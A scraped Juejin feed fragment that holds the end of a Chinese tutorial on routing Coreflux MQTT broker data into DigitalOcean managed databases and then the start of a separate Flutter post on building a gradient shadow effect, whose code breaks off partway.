<ol>
<li>使用来自你的<strong>DigitalOcean</strong>数据库的连接字符串</li>
<li>导航到 coreflux-broker-data 数据库（或你为数据库指定的名称）</li>
<li>检查 MachineProductionData 表中存储的记录</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15ebdeea44a64b41ba72c5a8055e5da1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=Yh%2FR6WA5EC5dLNNLgZQemJmlfkw%3D" alt="显示存储的物联网记录的PostgreSQL表" loading="lazy"/></p>
<p>正如我们之前看到的，所有数据都可在MQTT代理中用于其他用途和集成。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b07b061a1994091bdc5df8d2926dcef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=vOyTBd0J35Y24sAqAW8POpse7Zg%3D" alt="带有实时机器数据的MQTT主题" loading="lazy"/></p>
<h4 data-id="heading-49">验证MongoDB存储</h4>
<p>使用MongoDB Compass连接到你的<strong>MongoDB****托管数据库</strong>以验证<strong>可扩展存储</strong>：</p>
<ol>
<li>使用来自你的<strong>DigitalOcean</strong>数据库的连接字符串</li>
<li>导航到 coreflux-broker-data 数据库（或你为数据库指定的名称）</li>
<li>检查 MachineProductionData 集合中存储的文档</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3ba636e15fa4c88a716559959871047~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=tytzoGg2eQY2fXxuNaSypRsbFb8%3D" alt="检查数据库存储" loading="lazy"/></p>
<p>你应该看到具有类似结构的<strong>实时数据</strong>文档：</p>
<pre><code class="hljs language-bash" lang="bash">{
  <span class="hljs-string">"_id"</span>: {
    <span class="hljs-string">"<span class="hljs-variable">$oid</span>"</span>: <span class="hljs-string">"68626dc3e8385cbe9a1666c3"</span>
  },
  <span class="hljs-string">"energy"</span>: 36,
  <span class="hljs-string">"energy_wh"</span>: 36000,
  <span class="hljs-string">"production_status"</span>: <span class="hljs-string">"active"</span>,
  <span class="hljs-string">"production_count"</span>: 31,
  <span class="hljs-string">"stoppage"</span>: 0,
  <span class="hljs-string">"maintenance_alert"</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-string">"timestamp"</span>: <span class="hljs-string">"2025-06-30 10:58:11"</span>,
  <span class="hljs-string">"device_name"</span>: <span class="hljs-string">"station2"</span>
}
</code></pre>
<p>正如我们之前看到的，所有数据都可在MQTT代理中用于其他用途和集成。</p>
<h4 data-id="heading-50">验证MySQL存储</h4>
<p>使用DBeaver连接到你的<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aidroplet.com%2Fproduct%2Fmysql%2F" target="_blank" title="https://www.aidroplet.com/product/mysql/" ref="nofollow noopener noreferrer">MySQL托管数据库</a>以验证可扩展存储：</p>
<ol>
<li>使用来自你的<strong>DigitalOcean</strong>数据库的连接字符串</li>
<li>导航到<code>coreflux-broker-data</code>数据库（或你为数据库指定的名称）</li>
<li>检查<code>MachineProductionData</code>表中存储的记录</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5a7d692129a4df5890a37ab74e4e3bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=zDI6w7J4MPYIl5qFYrFa%2F19%2Bfrs%3D" alt="验证MySQL中存储的物联网记录" loading="lazy"/></p>
<p>与其他集成一样，所有数据也可在MQTT代理中用于其他用途和下游集成。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58ba806dc2534192a9c8a42f5e943963~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=axLM5OfvlFeFZvasRnQU%2BoO3OVg%3D" alt="监控实时数据流" loading="lazy"/></p>
<h4 data-id="heading-51">验证OpenSearch存储</h4>
<p>使用提供的URL和凭据打开<strong>OpenSearch****Dashboards</strong>：</p>
<ol>
<li>打开菜单并选择索引管理选项
<ol>
<li>在菜单中选择索引选项，查看你的表名是否出现在列表中</li>
</ol>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdcff95247ef4cc5ad338d8fa35766a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=jhLF7saZMBuLxp21qmbVP2JAYbE%3D" alt="检查数据库存储" loading="lazy"/></p>
<ol>
<li>返回主页并在菜单中选择发现选项
<ol>
<li>按照提供的步骤创建索引模式</li>
<li>返回到发现页面，你应该会看到你的数据</li>
</ol>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ee012b9ce8a49108ec660a2569c8e9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=q%2B13jJKUm5ynpv8RGkap9gSaAKU%3D" alt="检查数据库存储" loading="lazy"/></p>
<p>正如我们之前看到的，所有数据都可在MQTT代理中用于其他用途和集成。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/828334c7b1b8458680bdf79cdc9bc3c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlnaXRhbE9jZWFu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708130&amp;x-signature=zsq0rR3CL87WsZi4K94mriFSobA%3D" alt="检查数据库存储" loading="lazy"/></p>
<h3 data-id="heading-52">步骤10 - 扩展你的用例和集成</h3>
<h4 data-id="heading-53">测试LoT能力</h4>
<ul>
<li><strong>发布示例数据</strong>：使用MQTT Explorer将示例数据集发布到你的<strong>Coreflux代理</strong>。尝试不同的负载结构和不同的模型/操作，查看它们如何处理并存储到你选择的数据库中。</li>
<li><strong>数据验证</strong>：验证你数据库中的数据与你发布的有效负载是否匹配。使用你的数据库客户端（PostgreSQL使用DBeaver，MongoDB使用MongoDB Compass，OpenSearch使用OpenSearch Dashboards）检查一致性和准确性，确保你的<strong>物联网自动化</strong>集成按预期工作。比较时间戳、字段转换和数据类型，以验证你的<strong>实时数据</strong>管道。</li>
<li><strong>实时监控</strong>：使用另一个MQTT数据源（例如具有MQTT连接功能的简单传感器）设置连续的<strong>实时数据</strong>馈送。观察<strong>Coreflux</strong>和你的数据库如何处理传入的<strong>物联网</strong>数据流，并探索数据检索和查询的响应时间。</li>
</ul>
<h4 data-id="heading-54">构建分析和可视化</h4>
<ul>
<li><strong>创建仪表板</strong>：与Grafana等可视化工具集成，创建显示你的<strong>物联网</strong>数据的仪表板，从实时MQTT主题和历史数据库查询中提取数据。跟踪指标，如设备正常运行时间、传感器读数、生产计数或来自你<strong>自动化</strong>系统的维护警报。了解如何使用我们的教程设置DigitalOcean托管数据库与Prometheus和Grafana的监控。对于实时仪表板，直接订阅MQTT主题；对于历史趋势和聚合，查询你的数据库。</li>
<li><strong>趋势分析</strong>：利用你数据库的能力来分析随时间变化的趋势：
<ul>
<li><strong>PostgreSQL</strong>：使用SQL查询进行复杂的关系分析</li>
<li><strong>MongoDB</strong>：使用聚合框架进行基于文档的分析</li>
<li><strong>OpenSearch</strong>：使用高级分析和搜索能力进行全文搜索和时间序列分析</li>
</ul>
</li>
<li><strong>多数据库集成</strong>：探索集成其他<strong>托管数据库</strong>，如用于非结构化数据的<strong>MongoDB</strong>，用于关系数据的<strong>PostgreSQL</strong>，用于结构化查询的<strong>MySQL</strong>，或用于高级分析和搜索的<strong>OpenSearch</strong>。使用<strong>Coreflux</strong>路由将数据同时发送到多个目的地。</li>
</ul>
<h4 data-id="heading-55">优化和扩展你的物联网基础设施</h4>
<ul>
<li><strong>负载测试</strong>：使用<strong>LoT Notebook</strong>或自动化脚本通过同时发布多条消息来模拟高流量。监控你的<strong>Coreflux MQTT代理</strong>和数据库集群如何处理负载，并识别你的<strong>数据****管道</strong>中的任何瓶颈。</li>
<li><strong>扩展</strong>：<strong>DigitalOcean</strong>提供垂直和水平扩展选项。随着你的<strong>物联网</strong>数据需求增长，增加<strong>droplet</strong>资源（CPU、RAM或存储）。扩展你的<strong>托管数据库</strong>集群以处理更大的数据集，并配置自动扩展警报，以便在接近资源限制时通知你。</li>
</ul>
<h3 data-id="heading-56">常见问题解答</h3>
<h4 data-id="heading-57">1. 如何将Coreflux MQTT代理与托管数据库集成？</h4>
<p>你通过定义指向目标服务（PostgreSQL、MySQL、MongoDB或OpenSearch）的LoT<strong>Route</strong>来将Coreflux MQTT代理与托管数据库集成。每个路由使用适当的连接参数（服务器或连接字符串、端口、数据库名称、用户名、密码和SSL/TLS选项），并自动将MQTT消息有效负载持久化到表、集合或索引中。一旦定义好路由，你就使用<code>STORE IN</code>指令将其附加到<strong>Model</strong>，这样每个处理后的消息都会被写入你选择的数据库。</p>
<h4 data-id="heading-58">2. 我能否在不编写自定义集成代码的情况下将MQTT数据直接保存到数据库？</h4>
<p>可以。Coreflux设计为一个<strong>低代码</strong>集成层，因此你无需编写应用程序代码或外部ETL作业来持久化数据。对于每种数据库类型，你配置一个LoT路由（例如，<code>PostgreSQL_Log</code>、<code>MySQL_Log</code>、<code>mongo_route</code>或<code>OpenSearch_Log</code>），然后使用<code>STORE IN "&lt;route_name&gt;" WITH TABLE "MachineProductionData"</code>扩展你的模型。Coreflux处理连接池、重试和错误处理，因此你可以专注于建模主题和转换，而不是样板数据库代码。</p>
<h4 data-id="heading-59">3. 我应该为MQTT物联网数据存储选择哪种托管数据库？</h4>
<p>你的MQTT物联网数据的最佳托管数据库取决于你的数据结构、查询需求和分析目标。使用下面的比较表来帮助你决定：</p>






























<table><thead><tr><th>数据库</th><th>最适合</th><th>示例用例</th></tr></thead><tbody><tr><td><strong>PostgreSQL</strong></td><td>强一致性、关系模式、复杂的SQL查询</td><td>工业传感器网络、事务性事件、需要跨连接数据集的分析</td></tr><tr><td><strong>MySQL</strong></td><td>关系数据、结构化查询、广泛的兼容性</td><td>库存系统、生产指标、传统业务记录</td></tr><tr><td><strong>MongoDB</strong></td><td>灵活、不断演进的模式；文档存储</td><td>具有可变负载的互联设备、具有变化格式的物联网遥测</td></tr><tr><td><strong>OpenSearch</strong></td><td>全文搜索、分析、仪表板、日志索引</td><td>时间序列分析、监控、事件日志、物联网搜索和可视化</td></tr></tbody></table>
<p><strong>提示：</strong> 你可以通过配置多个Coreflux路由同时使用多个托管数据库。这使得可以从同一个MQTT流中，将结构化的物联网数据存储在PostgreSQL或MySQL中，在OpenSearch中聚合日志和指标，并在MongoDB中收集非结构化或无模式数据。</p>
<h4 data-id="heading-60">4. 这种架构如何处理实时和历史分析？</h4>
<p>Coreflux将所有处理后的值保留在MQTT主题上，供<strong>实时</strong>消费、仪表板或额外管道使用，而Routes则将相同的建模数据持久化到你的数据库中，用于<strong>历史</strong>查询。在实践中，你可以订阅主题以进行即时反应（警报、控制回路），并查询PostgreSQL/MySQL/MongoDB/OpenSearch以进行聚合、趋势和长期分析。这种双路径设计反映了MQTT和物联网数据集成教程中的常见模式，其中代理提供实时消息传递，而数据库提供持久存储和分析。</p>
<h4 data-id="heading-61">5. Coreflux和托管数据库之间的连接有多安全？</h4>
<p>当部署在DigitalOcean上时，你可以使用VPC网络来保持Coreflux MQTT代理和数据库之间的所有通信私密。VPC将你的资源与公共互联网访问隔离开来，并且DigitalOcean托管数据库支持连接的TLS加密。此外，你可以为你的Coreflux应用程序创建具有有限权限的专用数据库用户，遵循最小权限原则。</p>
<h4 data-id="heading-62">6. 这个设置是否适用于生产环境物联网部署？</h4>
<p>是的。这种架构反映了生产环境中MQTT和数据库集成所使用的模式，其中代理前端处理设备流量，而托管数据库层提供持久性和分析。DigitalOcean托管数据库提供自动备份、高可用性和监控，而Coreflux MQTT代理可以水平扩展以处理高消息吞吐量。对于生产环境，你还应该配置防火墙规则、使用强凭据、为MQTT和数据库连接启用TLS，并根据预期的消息量来调整你的droplet和集群大小。</p>
<h4 data-id="heading-63">7. 我能否在没有公共互联网访问的情况下，或在混合环境中运行MQTT代理？</h4>
<p>可以。MQTT代理通常部署在私有网络或边缘环境中，公共资源一致指出，只要客户端可以访问代理，MQTT就可以在没有公共互联网的情况下工作。使用DigitalOcean，你可以将Coreflux和你的数据库保持在VPC内部，并且只暴露绝对必要的内容（例如，VPN、堡垒主机或有限的防火墙规则）。如果你需要混合或多站点架构，你还可以将选定的主题与其他代理或云区域同步。</p>
<h4 data-id="heading-64">8. 在物联网数据中使用MQTT和数据库是否存在任何限制或权衡？</h4>
<p>MQTT针对轻量级、事件驱动的消息传递进行了优化；数据库则针对存储和查询进行了优化。存储<strong>每一条</strong>原始消息可能会变得昂贵或嘈杂，因此最佳实践建议仔细建模数据（例如，聚合指标、过滤主题或降采样）。极低功耗设备或超受限网络可能难以维持持久连接或处理TLS开销，在这种情况下，你可能需要调整QoS级别、批处理和保留策略。只要你在设计中考虑到这些权衡，MQTT加上托管数据库对于大多数物联网场景都能很好地工作。</p>
<h4 data-id="heading-65">9. 我如何为我的物联网项目在PostgreSQL、MySQL、MongoDB和OpenSearch之间做出选择？</h4>
<p>你应该根据物联网数据结构、可扩展性以及你希望如何查询设备数据来选择托管数据库。下表总结了每个选项的优势：</p>



































<table><thead><tr><th>数据库</th><th>当...时最佳</th><th>典型用例</th><th>关键优势</th></tr></thead><tbody><tr><td><strong>PostgreSQL</strong></td><td>你需要复杂的关系查询、强一致性和事务完整性（ACID支持）。</td><td>工业传感器网络、将设备数据与生产相关联、需要对连接的数据集进行分析</td><td>关系模式、高级SQL、一致性</td></tr><tr><td><strong>MySQL</strong></td><td>你的工作负载是结构化的，具有广泛的工具和兼容性需求。</td><td>库存跟踪、传统业务系统、生产指标</td><td>更简单的关系需求、广泛支持</td></tr><tr><td><strong>MongoDB</strong></td><td>你的设备负载和模式不断演变，或者你希望使用灵活的、基于文档的存储进行快速原型设计。</td><td>具有可变格式的物联网遥测、快速开发、半结构化数据</td><td>灵活的模式、易于扩展、快速原型设计</td></tr><tr><td><strong>OpenSearch</strong></td><td>你需要分析、搜索或对大容量的物联网数据（日志、时间序列、事件）进行仪表板展示。</td><td>搜索传感器数据、日志分析、可视化、基于关键字/时间的查询</td><td>搜索、全文、分析、快速聚合</td></tr></tbody></table>
<h3 data-id="heading-66">结论</h3>
<p>将Coreflux MQTT代理与DigitalOcean的托管数据库服务（PostgreSQL、MongoDB、MySQL或OpenSearch）集成，为你提供了实时物联网数据处理和存储的完整设置。按照本教程，你已经使用低代码开发实践构建了一个收集、处理和存储物联网数据的自动化管道。</p>
<p>借助Coreflux的架构和你选择的数据库的存储特性，你可以处理大量的实时数据并查询它以获取洞察。无论你是监控工业系统、跟踪环境传感器还是管理智慧城市基础设施，这种设置都让你能够基于实时MQTT主题和历史数据库查询做出数据驱动的决策。</p>
<p>了解更多关于DigitalOcean托管数据库的信息，以及DigitalOcean 针对 IoT行业的产品服务支持，可咨询 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aidroplet.com%2F" target="_blank" title="https://www.aidroplet.com/" ref="nofollow noopener noreferrer">DigitalOcean 中国区独家战略合作伙伴卓普云AI Droplet（aidroplet.com）</a>。</p>
<p>你可以尝试提供的用例或使用<strong>Coreflux和DigitalOcean</strong>实现你自己的用例。你还可以在DigitalOcean Droplet市场或通过Coreflux网站获取免费的<strong>Coreflux MQTT代理</strong>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一起实现一个阴影效果]]></title>    <link>https://juejin.cn/post/7602447286606561289</link>    <guid>https://juejin.cn/post/7602447286606561289</guid>    <pubDate>2026-02-03T07:32:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602447286606561289" data-draft-id="7602206323460587571" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一起实现一个阴影效果"/> <meta itemprop="keywords" content="Android,Flutter"/> <meta itemprop="datePublished" content="2026-02-03T07:32:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="火柴就是我"/> <meta itemprop="url" content="https://juejin.cn/user/272334614705575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一起实现一个阴影效果
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/272334614705575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    火柴就是我
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T07:32:01.000Z" title="Tue Feb 03 2026 07:32:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6eba19c3e6334ca4906732ccb002ecac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708720&amp;x-signature=1I8wlW8qVvgnlmYIbqWIr5F6Nvg%3D" alt="image.png" width="30%" loading="lazy"/>
<p>需要的效果：1 有边框，白色的,但是右边的边框并没有显示。2 底部蓝色的阴影，不只是底部有阴影，内容下面也有淡淡的阴影。</p>
<p>实现效果</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79c27efd2f434681a29b22c69cbdafd0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770708720&amp;x-signature=sRyS8VyUUpACb0OI62ydGFUxIMI%3D" alt="image.png" width="30%" loading="lazy"/>
<p>代码（主要就是堆叠➕渐变）</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">Material</span>(
  <span class="hljs-attribute">color</span>: Color.<span class="hljs-built_in">fromARGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">245</span>, <span class="hljs-number">230</span>, <span class="hljs-number">225</span>),
  <span class="hljs-attribute">child</span>: <span class="hljs-built_in">Stack</span>(
    <span class="hljs-attribute">alignment</span>: Alignment.center,
    <span class="hljs-attribute">children</span>: [
      <span class="hljs-built_in">Container</span>(
        <span class="hljs-attribute">width</span>: <span class="hljs-attribute">width</span>,
        <span class="hljs-attribute">height</span>: <span class="hljs-attribute">height</span>,
        <span class="hljs-attribute">padding</span>: EdgeInsets.<span class="hljs-built_in">symmetric</span>(<span class="hljs-attribute">vertical</span>: borderWidth,<span class="hljs-attribute">horizontal</span>: borderWidth),
        <span class="hljs-attribute">decoration</span>: <span class="hljs-built_in">BoxDecoration</span>(
            <span class="hljs-attribute">borderRadius</span>: BorderRadius.<span class="hljs-built_in">circular</span>(<span class="hljs-number">50</span>),
            <span class="hljs-attribute">gradient</span>: <span class="hljs-built_in">LinearGradient</span>(
                <span class="hljs-attribute">begin</span>: Alignment.topLeft,
                <span class="hljs-attribute">end</span>: Alignment.bottomCenter,
                <span class="hljs-attribute">stops</span>: [
                  <span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>,<span class="hljs-number">1</span>,
                ],
                <span class="hljs-attribute">colors</span>: [
                  Colors.white,
                  <span class="hljs-attribute">Color</span>.<span class="hljs-built_in">fromRGBO</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.9</span>),
                  <span class="hljs-attribute">Color</span>.<span class="hljs-built_in">fromRGBO</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>),
                ]),
            <span class="hljs-attribute">boxShadow</span>: [
              <span class="hljs-built_in">BoxShadow</span>(
                  <span class="hljs-attribute">color</span>: <span class="hljs-attribute">Color</span>.<span class="hljs-built_in">fromARGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">180</span>, <span class="hljs-number">224</span>, <span class="hljs-number">218</span>),
                  <span class="hljs-attribute">offset</span>: <span class="hljs-built_in">Offset</span>(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>),
                  <span class="hljs-attribute">blurRadius</span>: <span class="hljs-number">50</span>,
                  <span class="hljs-attribute">blurStyle</span>: BlurStyle.inner
              ),
              <span class="hljs-built_in">BoxShadow</span>(
                  <span class="hljs-attribute">color</span>: <span class="hljs-attribute">Color</span>.<span class="hljs-built_in">fromARGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">180</span>, <span class="hljs-number">224</span>, <span class="hljs-number">218</span>),
                  <span class="hljs-attribute">offset</span>: <span class="hljs-built_in">Offset</span>(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>),
                  <span class="hljs-attribute">blurRadius</span>: <span class="hljs-number">15</span>,
                  <span class="hljs-attribute">blurStyle</span>: BlurStyle.outer
              )
            ]
        ),
        <span class="hljs-attribute">child</span>:  <span class="hljs-built_in">Container</span>(
          <span class="hljs-attribute">width</span>: <span class="hljs-attribute">width</span>,
          <span class="hljs-attribute">height</span>: <span class="hljs-attribute">height</span>,
          <span class="hljs-attribute">decoration</span>: <span class="hljs-built_in">BoxDecoration</span>(
            <span class="hljs-attribute">borderRadius</span>: BorderRadius.<span class="hljs-built_in">circular</span>(<span class="hljs-number">45</span>),
            <span class="hljs-attribute">gradient</span>: <span class="hljs-built_in">LinearGradient</span>(
                <span class="hljs-attribute">begin</span>: Alignment.topLeft,
                <span class="hljs-attribute">end</span>: Alignment.bottomCenter,
                <span class="hljs-attribute">stops</span>: [
                  <span class="hljs-number">0</span>,<span class="hljs-number">0.5</span>,<span class="hljs-number">1</span>,
                ],
                <span class="hljs-attribute">colors</span>: [
                  <span class="hljs-attribute">Color</span>.<span class="hljs-built_in">fromRGBO</span>(<span class="hljs-number">245</span>, <span class="hljs-number">230</span>, <span class="hljs-number">225</span>, <span class="hljs-number">1</span>),
                  <span class="hljs-attribute">Color</span>.<span class="hljs-built_in">fromRGBO</span>(<span class="hljs-number">245</span>, <span class="hljs-number">230</span>, <span class="hljs-number">225</span>, <span class="hljs-number">0.9</span>),
                  <span class="hljs-attribute">Color</span>.<span class="hljs-built_in">fromRGBO</span>(<span class="hljs-number">245</span>, <span class="hljs-number">230</span>, <span class="hljs-number">225</span>, <span class="hljs-number">0.1</span>),
                ]),
          ),
          <span class="hljs-attribute">alignment</span>: Alignment.center,
          <span class="hljs-attribute">child</span>: <span class="hljs-built_in">Text</span>(<span class="hljs-string">"蓝牙连接稳定"</span>,
              <span class="hljs-attribute">style</span>: <span class="hljs-built_in">TextStyle</span>(
                  <span class="hljs-attribute">fontSize</span>: <span class="hljs-number">30</span>,
